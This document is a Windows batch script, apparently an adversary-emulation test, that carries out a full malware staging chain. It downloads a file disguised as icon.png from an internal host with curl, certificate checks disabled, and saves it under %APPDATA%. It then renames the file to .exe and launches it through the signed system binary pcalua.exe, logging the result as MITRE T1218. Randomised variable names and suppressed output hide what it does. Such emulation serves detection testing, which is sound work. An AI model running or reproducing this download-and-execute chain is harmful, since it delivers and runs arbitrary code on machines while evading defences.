@echo off
SETLOCAL EnableDelayedExpansion

REM Declare random-named SET variables for all PHR placeholders
SET yvcfxgu=%APPDATA%\10589\04128e61
SET djatklw=3804d29e.txt
SET zphmqei=https://10.0.0.49/stage/2/icon.png?10589-7
SET rkfvtue=BALAM-S2B
SET lxcpnso=10589
SET wjmgbha=7
SET qugrdyf=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once for all debug lines
SET tsvar=%DATE%/%TIME%

REM Step 1: Heartbeat fetch (downloads the Loader DLL)
echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: heartbeat_start>> "!qugrdyf!" 2>nul
curl -k -s -o "!yvcfxgu!\!djatklw!" "!zphmqei!"
if exist "!yvcfxgu!\!djatklw!" (
    echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: heartbeat_complete=0>> "!qugrdyf!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: heartbeat_complete=1>> "!qugrdyf!" 2>nul
)

REM Step 2: Change to output directory
echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: chdir_start>> "!qugrdyf!" 2>nul
cd /d "!yvcfxgu!" >nul 2>&1
SET chdir_ret=!errorlevel!
echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: chdir_result=!chdir_ret!>> "!qugrdyf!" 2>nul

REM Step 3: Rename the downloaded file to .exe
echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: rename_start>> "!qugrdyf!" 2>nul
ren "!djatklw!" "!djatklw!.exe" 2>nul
SET ren_ret=!errorlevel!
echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: rename_result=!ren_ret!>> "!qugrdyf!" 2>nul

REM Step 4: LOLBIN invocation of the downloaded Loader via pcalua.exe
echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: pcalua_start>> "!qugrdyf!" 2>nul
pcalua.exe -a "!djatklw!.exe" >nul 2>&1
SET pcalua_ret=!errorlevel!
echo [!tsvar!][DEBUG][!rkfvtue!][!lxcpnso!]: pcalua_result=!pcalua_ret!>> "!qugrdyf!" 2>nul

REM Step 5: TTP logging for LOLBIN execution
if !pcalua_ret! equ 0 (
    echo [%date% %time%][TTP][!rkfvtue!][!lxcpnso!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!qugrdyf!" 2>nul
) else (
    echo [%date% %time%][TTP][!rkfvtue!][!lxcpnso!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!qugrdyf!" 2>nul
)

ENDLOCAL